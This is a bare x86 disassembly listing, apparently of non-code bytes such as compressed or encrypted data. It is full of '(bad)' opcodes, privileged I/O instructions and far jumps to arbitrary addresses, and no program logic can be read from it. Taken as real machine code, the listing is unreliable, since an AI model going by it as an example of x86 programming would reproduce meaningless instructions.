  4133c6:	sub    BYTE PTR [eax+0x4a],dh
  4133c9:	sub    dh,dl
  4133cb:	mov    ebp,0x2154fa28
  4133d0:	icebp  
  4133d1:	(bad)  
  4133d2:	adc    eax,DWORD PTR [ebx]
  4133d4:	addr16 call 0xa1cb4c36
  4133da:	cs cld 
  4133dc:	into   
  4133dd:	lea    esi,[eax+eiz*1-0x31]
  4133e1:	xor    BYTE PTR [ebx-0x5f],cl
  4133e4:	jp     0x413443
  4133e6:	sub    DWORD PTR [edx],esp
  4133e8:	push   ebp
  4133e9:	enter  0x7353,0x3f
  4133ed:	daa    
  4133ee:	jl     0x413395
  4133f0:	inc    eax
  4133f1:	lods   eax,DWORD PTR ds:[esi]
  4133f2:	lds    edi,FWORD PTR [esi-0x76]
  4133f5:	xchg   ecx,eax
  4133f6:	(bad)  
  4133f7:	pop    dx
  4133f9:	mov    ebx,0x2a8841c9
  4133fe:	cmp    esi,DWORD PTR [edi+0x5e]
  413401:	repz xor ecx,0x6
  413405:	mov    ecx,0xcfecb722
  41340a:	lods   eax,DWORD PTR ss:[esi]
  41340c:	test   DWORD PTR [ebx*8-0x209483ae],edx
  413413:	sbb    edi,esi
  413415:	mov    bl,0x34
  413417:	out    dx,al
  413418:	or     BYTE PTR [edi],al
  41341a:	sbb    DWORD PTR [edi+0x7d],esp
  41341d:	shl    DWORD PTR [esi+0x61],1
  413420:	(bad)  
  413421:	mov    ebx,0xc44e01c3
  413426:	js     0x413440
  413428:	add    al,BYTE PTR [edi-0x541c4988]
  41342e:	in     al,dx
  41342f:	jle    0x4134a5
  413431:	push   ecx
  413432:	mov    ebp,0xdf191dd1
  413437:	js     0x413404
  413439:	inc    esp
  41343a:	repz int3 
  41343c:	(bad)  
  41343d:	test   eax,0x8bb88a00
  413442:	or     dl,bh
  413444:	adc    eax,0x330964f2
  413449:	sub    DWORD PTR [esi],edi
  41344b:	cld    
  41344c:	ins    BYTE PTR es:[edi],dx
  41344d:	push   0xffffffc0
  41344f:	or     eax,0x55045ea4
  413454:	and    BYTE PTR [edi+ebx*4-0x63],0xfa
  413459:	pusha  
  41345a:	loope  0x413454
  41345c:	jbe    0x413483
  41345e:	mov    es,WORD PTR [edi]
  413460:	push   0xcbb2cfba
  413465:	inc    ecx
  413466:	inc    esp
  413467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413468:	fwait
  413469:	leave  
  41346a:	fucomp st(1)
  41346c:	mov    ds:0xfe3e7ca3,al
  413471:	(bad)  [edx]
  413473:	scas   eax,DWORD PTR es:[edi]
  413474:	outs   dx,DWORD PTR ds:[esi]
  413475:	or     eax,0x18a21407
  41347a:	inc    ebp
  41347b:	or     BYTE PTR [edx+0x2b],ah
  41347e:	or     al,0x11
  413480:	retf   
  413481:	inc    esi
  413482:	xchg   edi,eax
  413483:	mov    eax,0xe4911091
  413488:	cmp    bl,al
  41348a:	stos   DWORD PTR es:[edi],eax
  41348b:	sbb    eax,0x2d0a47b5
  413490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413491:	cwde   
  413492:	sbb    ah,cl
  413494:	mov    edi,fs
  413496:	jg     0x413470
  413498:	cwde   
  413499:	aam    0x80
  41349b:	mov    edx,0xf4da6303
  4134a0:	(bad)  
  4134a1:	push   esi
  4134a2:	clc    
  4134a3:	mov    ebp,ebp
  4134a5:	inc    edi
  4134a6:	mov    ds:0x78c51fe8,eax
  4134ab:	adc    BYTE PTR [esi+0x72bf5bbe],bh
  4134b1:	add    BYTE PTR [edi],cl
  4134b3:	ret    
  4134b4:	fmul   DWORD PTR [edi-0x3d]
  4134b7:	jmp    0xc768:0x966512a7
  4134be:	dec    DWORD PTR [ebx+0xd620e]
  4134c4:	pop    edi
  4134c5:	pop    ecx
  4134c6:	cwde   
  4134c7:	cmp    al,0x4f
  4134c9:	jecxz  0x413531
  4134cb:	mov    eax,0x9dfe2a00
  4134d0:	and    DWORD PTR [edi-0x4d2dee9a],edx
  4134d6:	xlat   BYTE PTR ds:[ebx]
  4134d7:	aaa    
  4134d8:	je     0x4134d9
  4134da:	mov    ch,0x9b
  4134dc:	hlt    
  4134dd:	dec    ecx
  4134de:	mov    ebp,0x2d05a653
  4134e3:	sub    BYTE PTR [edi-0xcbb7c5b],dl
  4134e9:	cmp    eax,0x3a1d911d
  4134ee:	test   DWORD PTR [ebp-0x26],esp
  4134f1:	jmp    0x413554
  4134f3:	xor    eax,0x7d47287f
  4134f8:	add    eax,0x7ff58ea7
  4134fd:	jp     0x41352a
  4134ff:	add    DWORD PTR [eax],0xeb16468b
  413505:	enter  0x9096,0x2d
  413509:	iret   
  41350a:	mov    ds:0x6066d3b5,al
  41350f:	out    0x2b,al
  413511:	ficom  DWORD PTR [eax-0x29]
  413514:	in     al,dx
  413515:	dec    edx
  413516:	xchg   ebx,eax
  413517:	push   ss
  413518:	ss scas eax,DWORD PTR es:[edi]
  41351a:	sbb    DWORD PTR [ebp-0x1d0d67a8],edx
  413520:	or     ah,dl
  413522:	int3   
  413523:	loopne 0x4134bd
  413525:	and    DWORD PTR ds:[edi-0x7c8747e4],0xab2efc2d
  413530:	or     DWORD PTR [edi+0x2578870d],ecx
  413536:	fldl2t 
  413538:	and    eax,0xc06e4832
  41353d:	xchg   ecx,eax
  41353e:	jge    0x4134cb
  413540:	jo     0x413588
  413542:	mov    ds:0x100ace04,al
  413547:	sub    dh,ch
  413549:	pusha  
  41354a:	ins    BYTE PTR es:[edi],dx
  41354b:	and    bh,BYTE PTR [ebx]
  41354d:	xchg   ebp,eax
  41354e:	add    BYTE PTR [eax-0x1ab51ffa],dh
  413554:	cld    
  413555:	jle    0x4134f6
  413557:	and    dl,BYTE PTR [esi-0x45]
  41355a:	pop    esp
  41355b:	cmp    BYTE PTR [esi+0x69],al
  41355e:	scas   al,BYTE PTR es:[edi]
  41355f:	mov    dh,0xa7
  413561:	adc    eax,0xd2f8fb3b
  413566:	mov    eax,DWORD PTR [esi+0x576fcb0a]
  41356c:	clc    
  41356d:	mov    ah,0xcf
  41356f:	ins    DWORD PTR es:[edi],dx
  413570:	(bad)  
  413571:	out    0xc2,al
  413573:	pop    ebp
  413574:	ds icebp 
  413576:	inc    edi
  413577:	test   DWORD PTR [esi],0x6bf40976
  41357d:	xor    BYTE PTR [edx-0x69],0x83
  413581:	dec    ebx
  413582:	pop    edi
  413583:	mov    eax,0xe9745bca
  413588:	ds ja  0x4135f5
  41358b:	jb     0x413584
  41358d:	push   ebp
  41358e:	outs   dx,BYTE PTR ds:[esi]
  41358f:	out    0x1c,eax
  413591:	xchg   edi,eax
  413592:	xchg   DWORD PTR [edi+0x4902480c],esi
  413598:	std    
  413599:	adc    al,0x38
  41359b:	pushfw 
  41359d:	idiv   edx
  41359f:	add    eax,0xb35fc6f6
  4135a4:	mov    ds:0x2bf5a02a,eax
  4135a9:	push   esi
  4135ab:	rol    DWORD PTR [ebx],1
  4135ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ae:	cdq    
  4135af:	xor    DWORD PTR [eax-0x14],esi
  4135b2:	cmp    ch,dh
  4135b4:	retf   
  4135b5:	add    eax,0x54166a72
  4135ba:	push   ss
  4135bb:	sbb    DWORD PTR [esi-0x75],0x23
  4135bf:	dec    esi
  4135c0:	aas    
  4135c1:	mov    ds:0x3bdeb456,eax
  4135c6:	add    al,0xa
  4135c8:	(bad)  
  4135ca:	sbb    DWORD PTR [edi+0x67],esp
  4135cd:	add    BYTE PTR [edi],ch
  4135cf:	cmp    BYTE PTR [ecx],0x57
  4135d2:	push   edx
  4135d3:	stos   DWORD PTR es:[edi],eax
  4135d4:	jmp    0xeb4f:0xdebeeba
  4135db:	push   0x98de0230
  4135e0:	fdiv   DWORD PTR [esi]
  4135e2:	ror    BYTE PTR [ebp+0x1b00e3f0],0xa5
  4135e9:	test   BYTE PTR [edi],al
  4135eb:	jle    0x413655
  4135ed:	clc    
  4135ee:	mov    dl,0x7a
  4135f0:	repz adc al,0x64
  4135f3:	mov    ds:0x1d437a58,al
  4135f8:	ret    0xf1a4
  4135fb:	icebp  
  4135fc:	jmp    0xf2b1:0x986f974b
  413603:	test   DWORD PTR [eax],ecx
  413605:	(bad)  
  413606:	adc    eax,0x92cf15d7
  41360b:	scas   eax,DWORD PTR es:[edi]
  41360c:	xchg   esp,eax
  41360d:	not    BYTE PTR [eax+0x3e]
  413610:	dec    edx
  413611:	in     al,dx
  413612:	sub    DWORD PTR [esp+eax*1+0x3d],ebx
  413616:	sub    BYTE PTR [edi-0x3b],0xf6
  41361a:	adc    DWORD PTR ds:0x83475067,eax
  413620:	lock in eax,dx
  413622:	add    esi,ebx
  413624:	sti    
  413625:	ror    DWORD PTR [edi+eiz*8+0x4],cl
  413629:	push   ecx
  41362a:	or     dh,BYTE PTR [esi+edi*8-0x6c]
  41362e:	xchg   esp,eax
  41362f:	or     DWORD PTR [edx+0x44e1899b],0x14
  413636:	sub    al,0xb3
  413638:	bound  esp,QWORD PTR [edi]
  41363a:	in     eax,0xa9
  41363c:	xchg   esp,eax
  41363d:	cmc    
  41363e:	mov    cs,esp
  413640:	sbb    BYTE PTR [esi+0x3e],0x90
  413644:	push   cs
  413645:	adc    esp,DWORD PTR [edx+0x2a37abf8]
  41364b:	pop    ds
  41364c:	push   esp
  41364d:	scas   eax,DWORD PTR es:[edi]
  41364e:	jbe    0x4136a7
  413650:	push   ebx
  413651:	sbb    bl,ch
  413653:	(bad)  
  413655:	adc    DWORD PTR [edx+0x7f],edi
  413658:	cli    
  413659:	mov    edi,0x437512a1
  41365e:	jno    0x41365a
  413660:	mov    al,ds:0x57acdeac
  413665:	push   ebx
  413666:	cmp    eax,0xe279b2ba
  41366b:	or     eax,0x83b4e534
  413670:	add    BYTE PTR ds:0x72bbda31,ah
  413676:	ret    
  413677:	lds    ecx,FWORD PTR [ebp+0x9]
  41367a:	cli    
  41367b:	cmp    ecx,DWORD PTR [edx+edx*4+0x59e1cf40]
  413682:	cmp    al,0xe
  413684:	aaa    
  413685:	fmul   DWORD PTR cs:[edi]
  413688:	sti    
  413689:	shl    dl,cl
  41368b:	xchg   BYTE PTR [ecx],cl
  41368d:	loop   0x413694
  41368f:	ficom  WORD PTR [edi+0x22]
  413692:	into   
  413693:	pusha  
  413694:	pop    es
  413695:	inc    ebx
  413696:	jmp    0xcf61661b
  41369b:	dec    ebx
  41369c:	push   esi
  41369d:	mov    BYTE PTR [esi+edi*1-0x72],dh
  4136a1:	mov    ebx,0x5531022b
  4136a6:	rol    DWORD PTR ss:[esi+0x2b34c2e0],0x9b
  4136ae:	mov    BYTE PTR [edi-0xa],ch
  4136b1:	mov    dh,0x1d
  4136b3:	outs   dx,DWORD PTR ds:[esi]
  4136b4:	fnstsw WORD PTR [esi-0x39f94058]
  4136ba:	les    ecx,FWORD PTR [edi+0x24]
  4136bd:	ja     0x4136c8
  4136bf:	test   BYTE PTR cs:[edi-0x54],ch
  4136c3:	sbb    ebx,ecx
  4136c5:	sub    dh,BYTE PTR [ecx]
  4136c7:	es (bad) 
  4136c9:	sti    
  4136ca:	cdq    
  4136cb:	or     DWORD PTR [ebx-0x3b],eax
  4136ce:	mov    fs,WORD PTR [ecx]
  4136d0:	test   al,0xdb
  4136d2:	aad    0xd5
  4136d4:	nop
  4136d5:	jo     0x413692
  4136d7:	fld    QWORD PTR [ecx]
  4136d9:	cli    
  4136da:	xor    ebp,edx
  4136dc:	jbe    0x4136a5
  4136de:	rol    edx,0x21
  4136e1:	pop    esp
  4136e2:	dec    ebp
  4136e3:	inc    ebp
  4136e4:	arpl   sp,bx
  4136e6:	and    cl,ah
  4136e8:	lds    edx,FWORD PTR [ecx+eax*4-0x5b0501b4]
  4136ef:	jmp    0x51f0:0xdd2320c9
  4136f6:	inc    DWORD PTR [edi-0xb5706ab]
  4136fc:	fstp   TBYTE PTR [ecx+0x43a376d5]
  413702:	mov    esi,0x1831e66c
  413707:	xchg   DWORD PTR [esi],esi
  413709:	sbb    al,0x65
  41370b:	and    al,0x1d
  41370d:	push   esi
  41370e:	fadd   QWORD PTR [esp+esi*4]
  413711:	jo     0x41371b
  413713:	test   al,0x4a
  413715:	xchg   esp,eax
  413716:	pushf  
  413717:	test   eax,0x6f099bec
  41371c:	push   esp
  41371d:	sub    al,BYTE PTR [ecx]
  41371f:	or     DWORD PTR [esi-0x63428711],0xba228b03
  413729:	clc    
  41372a:	test   eax,0x6a347956
  41372f:	adc    ecx,edx
  413731:	mov    ch,0xda
  413733:	mov    ecx,0x33213578
  413738:	rol    ecx,1
  41373a:	push   eax
  41373b:	test   eax,0x68f7eca1
  413740:	sar    BYTE PTR [edx],0x28
  413743:	les    ecx,FWORD PTR [edx-0x5]
  413746:	adc    eax,0xd5f63f85
  41374b:	ror    BYTE PTR [ecx+0x44d261c0],0x2f
  413752:	in     eax,0x95
  413754:	push   0x441cbb60
  413759:	in     al,dx
  41375a:	or     ebp,0x814ab2a0
  413760:	fbld   TBYTE PTR [ecx*1-0x510e4bf]
  413767:	clc    
  413768:	xchg   ecx,eax
  413769:	out    dx,eax
  41376a:	push   esp
  41376b:	repz mov dl,0x74
  41376e:	sbb    edi,esi
  413770:	cli    
  413771:	xchg   esi,eax
  413772:	int3   
  413773:	adc    ch,bl
  413775:	in     al,0x3e
  413777:	jo     0x41379a
  413779:	push   eax
  41377a:	add    ebp,DWORD PTR [ebx+0x55]
  41377d:	sahf   
  41377e:	mov    fs,WORD PTR [edi-0x1d8fa86a]
  413784:	adc    al,0x3d
  413786:	gs ss pop edi
  413789:	js     0x413797
  41378b:	add    al,0x70
  41378d:	adc    BYTE PTR [eax+0x71],cl
  413790:	mov    ds:0x1b811e13,al
  413795:	imul   edx,DWORD PTR [eax-0x41],0x76
  413799:	mov    bx,0xacc4
  41379d:	cmp    al,0x1a
  41379f:	fst    DWORD PTR [ecx]
  4137a1:	(bad)  
  4137a2:	adc    eax,0x9be7fce2
  4137a7:	add    eax,0x8309c5b3
  4137ac:	fwait
  4137ad:	push   ss
  4137ae:	mov    eax,0x75329b13
  4137b3:	or     BYTE PTR [edx+0x16],al
  4137b6:	ror    DWORD PTR fs:[ebx+0x11b51c0d],cl
  4137bd:	xchg   ebp,eax
  4137be:	(bad)  
  4137bf:	mov    ebx,0x3e23cb83
  4137c4:	(bad)  
  4137c5:	jbe    0x41381e
  4137c7:	or     al,0xa0
  4137c9:	frstor [edi-0x1e]
  4137cc:	enter  0xe441,0x93
  4137d0:	mov    al,0xc8
  4137d2:	arpl   WORD PTR [ecx+0x9],bp
  4137d5:	cmp    al,0x30
  4137d7:	ret    0xc4bb
  4137da:	push   ss
  4137db:	adc    cl,BYTE PTR [esi]
  4137dd:	xor    DWORD PTR [edx],eax
  4137df:	xor    ebp,DWORD PTR [esi+edi*8+0x61]
  4137e3:	(bad)  
  4137e4:	ds pushf 
  4137e6:	xchg   DWORD PTR [ecx],esp
  4137e8:	popa   
  4137e9:	cld    
  4137ea:	pop    esp
  4137eb:	pop    eax
  4137ec:	outs   dx,BYTE PTR ds:[esi]
  4137ed:	pop    ss
  4137ee:	xchg   edi,eax
  4137ef:	setbe  BYTE PTR [ecx]
  4137f2:	pop    es
  4137f3:	sbb    edi,DWORD PTR [ecx+0x2a81314b]
  4137f9:	adc    ah,0x7
  4137fc:	add    DWORD PTR [edx],ebp
  4137fe:	mov    eax,ds:0x5f4bc9b9
  413803:	inc    ecx
  413804:	or     cl,BYTE PTR [edi]
  413806:	das    
  413807:	ja     0x4137b3
  413809:	xchg   BYTE PTR [esi+0x16],cl
  41380c:	jno    0x4137c4
  41380e:	pusha  
  41380f:	cld    
  413810:	mov    ch,0xc
  413812:	mov    ebp,0xa1b441b
  413817:	out    0x1b,eax
  413819:	xchg   BYTE PTR [ebx-0x71],al
  41381c:	imul   edx,edx,0x5a
  41381f:	mov    dh,0x5a
  413821:	out    0xfa,eax
  413823:	mov    dl,0x6f
  413825:	(bad)  
  413826:	push   ecx
  413827:	sub    al,0xf6
  413829:	push   eax
  41382a:	pop    ebx
  41382b:	(bad)  
  41382c:	(bad)  
  41382d:	xor    al,0x97
  41382f:	call   0xd5b5:0x6795ff7
  413836:	jl     0x41381b
  413838:	push   edx
  413839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41383a:	jecxz  0x4137d8
  41383c:	fcmovb st,st(5)
  41383e:	imul   ebp,DWORD PTR [ecx+0x46],0x1bd3b0a1
  413845:	pop    eax
  413846:	ss clc 
  413848:	ds inc esi
  41384a:	adc    eax,0x44732d5e
  41384f:	mov    WORD PTR [eax+ebp*4+0x26],ss
  413853:	into   
  413854:	and    al,0x50
  413856:	inc    eax
  413857:	mov    gs,esp
  413859:	jle    0x413878
  41385b:	add    al,0x58
  41385d:	inc    esi
  41385e:	cli    
  41385f:	push   eax
  413860:	mov    DWORD PTR [ecx+eiz*8],edi
  413863:	push   esi
  413864:	or     eax,0xfd7bc48a
  413869:	test   al,0x15
  41386b:	repnz or al,0x68
  41386e:	adc    eax,DWORD PTR [eax+edi*4]
  413871:	in     eax,dx
  413872:	popf   
  413873:	push   0xbc3b8a97
  413878:	inc    ebp
  413879:	iret   
  41387a:	push   0x798c6118
  41387f:	cmc    
  413880:	sub    ebp,DWORD PTR [ecx]
  413882:	push   ss
  413883:	push   0x7e25db53
  413888:	xor    al,0xde
  41388a:	jns    0x413863
  41388c:	push   ss
  41388d:	fucomp st(5)
  41388f:	movnti DWORD PTR [ebx+0x2e],ebp
  413893:	xchg   edx,eax
  413894:	call   0x2f886445
  413899:	push   esi
  41389a:	adc    eax,0x2c26effc
  41389f:	int    0xce
  4138a1:	fst    DWORD PTR [ebx]
  4138a3:	clc    
  4138a4:	lock int 0xe8
  4138a7:	push   edx
  4138a8:	(bad)  
  4138a9:	jmp    0xdd7e583a
  4138ae:	mov    dl,0xe8
  4138b0:	inc    esi
  4138b1:	cld    
  4138b2:	out    0xad,eax
  4138b4:	sub    BYTE PTR [edx+0x78d11c17],al
  4138ba:	popf   
  4138bb:	add    DWORD PTR [ebp-0x6406875e],ebp
  4138c1:	mov    cl,0x92
  4138c3:	fadd   QWORD PTR [edx]
  4138c5:	sar    DWORD PTR [ecx+0xa088ed],0xc6
  4138cc:	out    0xfa,al
  4138ce:	push   esp
  4138cf:	dec    esp
  4138d0:	inc    eax
  4138d1:	stos   DWORD PTR es:[edi],eax
  4138d2:	inc    esi
  4138d3:	mov    eax,0x4280d13e
  4138d8:	or     ah,BYTE PTR [ecx+0x3]
  4138db:	shl    BYTE PTR [ebx+esi*1+0x45],cl
  4138df:	ficomp DWORD PTR [eax-0x24]
  4138e2:	loopne 0x41394a
  4138e4:	xor    BYTE PTR [ebx],al
  4138e6:	jb     0x41390d
  4138e8:	and    BYTE PTR [ecx+0x8],ch
  4138eb:	sub    BYTE PTR [edi+0x3e],al
  4138ee:	popf   
  4138ef:	xchg   ebx,eax
  4138f0:	nop
  4138f1:	sti    
  4138f2:	and    BYTE PTR [eax+eax*8-0xdaeb4aa],ah
  4138f9:	cld    
  4138fa:	pop    edx
  4138fb:	push   es
  4138fc:	or     ebx,ebx
  4138fe:	shl    DWORD PTR [esi],0x3e
  413901:	shl    DWORD PTR [esi],1
  413903:	cwde   
  413904:	aas    
  413905:	mov    eax,ds:0xd06d047
  41390a:	int    0x19
  41390c:	jns    0x4138f2
  41390e:	ficom  DWORD PTR [esi]
  413910:	(bad)  
  413911:	std    
  413912:	cmp    BYTE PTR [edi+0x6a],ah
  413915:	mov    cl,0xcf
  413917:	cwde   
  413918:	jge    0x413977
  41391a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41391b:	inc    ebx
  41391c:	jmp    0x90a2:0xc469c6c0
  413923:	aaa    
  413924:	dec    ebx
  413925:	jbe    0x4138fe
  413927:	std    
  413928:	popa   
  413929:	dec    edi
  41392a:	in     al,0xaf
  41392c:	mov    edi,0x9d6f459d
  413931:	xchg   edi,eax
  413932:	sbb    al,0x8
  413934:	inc    eax
  413935:	dec    eax
  413936:	pop    edi
  413937:	cwde   
  413938:	repnz into 
  41393a:	sar    ecx,1
  41393c:	sar    eax,1
  41393e:	xor    eax,0x2be52d4
  413943:	and    al,0x77
  413945:	push   ecx
  413946:	lods   al,BYTE PTR ds:[esi]
  413947:	fdiv   DWORD PTR [ebp+0x40]
  41394a:	bnd jbe 0x413914
  41394d:	mov    WORD PTR [esi+edi*8],?
  413950:	push   edi
  413951:	adc    eax,0x17e194d5
  413956:	stos   DWORD PTR es:[edi],eax
  413957:	pop    edi
  413958:	lods   al,BYTE PTR ds:[esi]
  413959:	aaa    
  41395a:	jle    0x4139d0
  41395c:	rol    BYTE PTR [eax],1
  41395e:	lods   eax,DWORD PTR ds:[esi]
  41395f:	sahf   
  413960:	mov    dl,0x38
  413962:	(bad)  
  413963:	sti    
  413964:	xchg   BYTE PTR [edi+0x32],ch
  413967:	out    0xfb,eax
  413969:	and    DWORD PTR [ebx],ebp
  41396b:	cmp    al,0xb5
  41396d:	xor    bh,ah
  41396f:	pop    ds
  413970:	adc    eax,0x70af267b
  413975:	outs   dx,BYTE PTR ds:[esi]
  413976:	mov    edx,0x59d5cc0
  41397b:	sub    al,0xba
  41397d:	(bad)  
  41397e:	neg    ebx
  413980:	scas   eax,DWORD PTR es:[edi]
  413981:	retf   
  413982:	cmp    al,0x8
  413984:	or     BYTE PTR [edi+0x6375cf01],dl
  41398a:	sti    
  41398b:	mov    bh,0xcc
  41398d:	dec    ebx
  41398e:	popa   
  41398f:	aas    
  413990:	pop    ss
  413991:	cld    
  413992:	ins    DWORD PTR es:[edi],dx
  413993:	ins    DWORD PTR es:[edi],dx
  413994:	sbb    ecx,DWORD PTR [ebx-0x36c5033]
  41399a:	(bad)
  41399e:	push   ebx
  41399f:	sub    DWORD PTR [ecx],0x3e
  4139a2:	mov    dl,0xc1
  4139a4:	push   0x2ff11fa9
  4139a9:	repz jmp 0x41399b
  4139ac:	xchg   ebx,eax
  4139ad:	mov    ?,WORD PTR [ecx-0x77e465e2]
  4139b3:	es mov ebp,0xd3b14071
  4139b9:	fisttp WORD PTR [edi]
  4139bb:	or     ch,bh
  4139bd:	(bad)  
  4139bf:	aaa    
  4139c0:	sub    al,0xe0
  4139c2:	adc    al,0xa0
  4139c4:	out    dx,al
  4139c5:	pushw  0x1e70
  4139c9:	(bad)  
  4139cb:	push   ds
  4139cc:	dec    ebp
  4139cd:	jle    0x413953
  4139cf:	push   edi
  4139d0:	test   bh,bh
  4139d2:	dec    edi
  4139d3:	ss jmp 0x1a8:0xaf9dcd14
  4139db:	(bad)  
  4139dc:	mov    ebx,0xfc5bad8c
  4139e1:	and    al,0xd8
  4139e3:	push   ebx
  4139e4:	sti    
  4139e5:	sub    BYTE PTR ds:0x1ec93dbd,cl
  4139eb:	mov    dl,0xfc
  4139ed:	add    esp,0xffffff86
  4139f0:	inc    esp
  4139f1:	out    0xef,eax
  4139f3:	or     bl,al
  4139f5:	out    dx,eax
  4139f6:	xor    edx,esp
  4139f8:	out    0x29,eax
  4139fa:	dec    esp
  4139fb:	loopne 0x413a33
  4139fd:	ret    0xeddd
  413a00:	inc    ebp
  413a01:	adc    BYTE PTR [ebx],0x5d
  413a04:	stos   DWORD PTR es:[edi],eax
  413a05:	adc    al,0x8a
  413a07:	xchg   edx,eax
  413a08:	ret    0xebf1
  413a0b:	repz xor al,0x76
  413a0e:	or     eax,0xbe1afbe0
  413a13:	fadd   DWORD PTR [esi-0x74]
  413a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a17:	leave  
  413a18:	stc    
  413a19:	iret   
  413a1a:	dec    eax
  413a1b:	arpl   WORD PTR ds:0xefd128e8,si
  413a21:	jns    0x4139cf
  413a23:	iret   
  413a24:	js     0x413a64
  413a26:	or     ah,ch
  413a28:	cli    
  413a29:	lds    eax,FWORD PTR [eax+0x4a]
  413a2c:	dec    esp
  413a2d:	xor    esi,ebp
  413a2f:	stos   BYTE PTR es:[edi],al
  413a30:	test   eax,0xd25e87b0
  413a35:	push   esp
  413a36:	in     al,dx
  413a37:	jge    0x4139fc
  413a39:	aad    0xdf
  413a3b:	jl     0x413abc
  413a3d:	add    dh,BYTE PTR [eax-0x17e340d8]
  413a43:	mov    al,0xcc
  413a45:	and    esp,DWORD PTR [edx+esi*8-0x20f5228f]
  413a4c:	sub    cl,BYTE PTR [ecx+ecx*8-0x4f52821f]
  413a53:	repnz inc esi
  413a55:	popf   
  413a56:	xor    DWORD PTR [ecx+0x77],edx
  413a59:	mov    esp,0x5d0f8353
  413a5e:	(bad)  
  413a5f:	sbb    ch,bl
  413a61:	aam    0x8a
  413a63:	and    al,BYTE PTR [edx-0x15]
  413a66:	cmp    esi,edi
  413a68:	test   DWORD PTR [ebp+esi*4+0x6],edi
  413a6c:	stc    
  413a6d:	mov    ecx,0x42be1691
  413a72:	addr16 dec esi
  413a74:	test   DWORD PTR [edi],ebp
  413a76:	jne    0x413a81
  413a78:	pop    edi
  413a79:	xchg   edx,eax
  413a7a:	and    DWORD PTR [eax+0x5a38d57a],esp
  413a80:	pusha  
  413a81:	push   edi
  413a82:	cli    
  413a83:	jg     0x413a6a
  413a85:	jbe    0x413a4e
  413a87:	pop    edi
  413a88:	stos   BYTE PTR es:[edi],al
  413a89:	leave  
  413a8a:	push   0xdcf73847
  413a8f:	jno    0x413aa8
  413a91:	rol    DWORD PTR [ebp+0x6cce7d50],0x9d
  413a98:	inc    eax
  413a99:	jge    0x413ade
  413a9b:	and    eax,0xd5bb0f09
  413aa0:	inc    esp
  413aa1:	pop    ss
  413aa2:	mov    bh,0x2e
  413aa4:	fcmovb st,st(7)
  413aa6:	add    al,0xfb
  413aa8:	add    DWORD PTR [edi],0xc772ffd0
  413aae:	mov    ebx,0x70b034ab
  413ab3:	jnp    0x413ad5
  413ab5:	pop    ds
  413ab6:	std    
  413ab7:	adc    BYTE PTR [edi],0x65
  413aba:	cmp    eax,0x5428b8db
  413abf:	inc    edx
  413ac0:	xchg   edx,eax
  413ac1:	into   
  413ac2:	outs   dx,DWORD PTR ds:[esi]
  413ac3:	lods   al,BYTE PTR ds:[esi]
  413ac4:	add    al,0x27
  413ac6:	je     0x413ad7
  413ac8:	leave  
  413ac9:	ret    
  413aca:	or     al,0x89
  413acc:	and    al,0x81
  413ace:	dec    ecx
  413acf:	aaa    
  413ad0:	aaa    
  413ad1:	lods   eax,DWORD PTR ds:[esi]
  413ad2:	dec    ecx
  413ad3:	pop    esi
  413ad4:	jg     0x413a80
  413ad6:	push   ecx
  413ad7:	push   cs
  413ad8:	ror    DWORD PTR [ebx-0x744de456],1
  413ade:	stc    
  413adf:	pop    edi
  413ae0:	aam    0xa9
  413ae2:	inc    ecx
  413ae3:	rol    DWORD PTR [eax+esi*2],cl
  413ae6:	lea    edi,[ebp+0x6eff13a2]
  413aec:	pusha  
  413aed:	jno    0x413ade
  413aef:	clc    
  413af0:	sub    BYTE PTR [ebx+0x656d6a36],dh
  413af6:	fld    TBYTE PTR [esi+0x159c15d7]
  413afc:	sti    
  413afd:	lock fiadd WORD PTR [esi-0x50]
  413b01:	ror    BYTE PTR ds:0x35bcf0eb,cl
  413b07:	jbe    0x413a8a
  413b09:	data16 cs mov dh,0x70
  413b0d:	push   0x24582734
  413b12:	ss push ebp
  413b14:	pop    ss
  413b15:	outs   dx,DWORD PTR ds:[esi]
  413b16:	mov    dl,BYTE PTR ds:0xb7ae0c3b
  413b1c:	sbb    bh,BYTE PTR [edi]
  413b1e:	inc    esi
  413b1f:	jge    0x413b15
  413b21:	fxch   st(4)
  413b23:	mov    eax,ds:0xac2a8164
  413b28:	lods   eax,DWORD PTR ds:[esi]
  413b29:	cli    
  413b2a:	add    edi,ebx
  413b2c:	int3   
  413b2d:	dec    edi
  413b2e:	push   edx
  413b2f:	shr    ah,1
  413b31:	sub    eax,0x990511cc
  413b36:	jmp    0xc908:0x17614b8e
  413b3d:	dec    esp
  413b3e:	mov    bh,0x54
  413b40:	bound  esi,QWORD PTR [esi-0xc]
  413b43:	jmp    0x9ceb:0x543083a1
  413b4a:	xchg   ebp,eax
  413b4b:	mov    esp,0x99262c01
  413b50:	add    bh,BYTE PTR [ebp+0x2f0812b6]
  413b56:	add    al,BYTE PTR [ecx-0xa]
  413b59:	mov    esi,0xbb0aa21e
  413b5e:	icebp  
  413b5f:	xor    dh,BYTE PTR [eax+0x6e]
  413b62:	enter  0xad68,0x7b
  413b66:	stos   DWORD PTR es:[edi],eax
  413b67:	loopne 0x413b2c
  413b69:	sti    
  413b6a:	sti    
  413b6b:	mov    dh,0xf2
  413b6d:	jno    0x413b3e
  413b6f:	xchg   ebx,eax
  413b70:	dec    ebp
  413b71:	clc    
  413b72:	xor    esp,DWORD PTR [esi-0x2ca1a907]
  413b78:	push   esi
  413b79:	or     DWORD PTR [esi+0x4a2e7ac9],esp
  413b7f:	ja     0x413b70
  413b81:	jecxz  0x413ba6
  413b83:	adc    DWORD PTR [ebp-0x2a],0x18
  413b87:	jnp    0x413b92
  413b89:	ins    DWORD PTR es:[edi],dx
  413b8a:	pop    ss
  413b8b:	imul   ebp,DWORD PTR [ebp-0x7f],0x3a
  413b8f:	adc    edi,DWORD PTR [eax+0x42]
  413b92:	mov    ebx,0x99fcdc1a
  413b97:	bound  ebp,QWORD PTR [edx]
  413b99:	shl    DWORD PTR [ebx-0x62ca93f6],0x6c
  413ba0:	(bad)  
  413ba1:	push   ds
  413ba2:	pop    ebx
  413ba3:	int    0x3
  413ba5:	stc    
  413ba6:	stos   DWORD PTR es:[edi],eax
  413ba7:	mov    ds:0xf941dcfd,eax
  413bac:	mov    edx,0xa0d42ae8
  413bb1:	jmp    0x42bb:0xfc123ea5
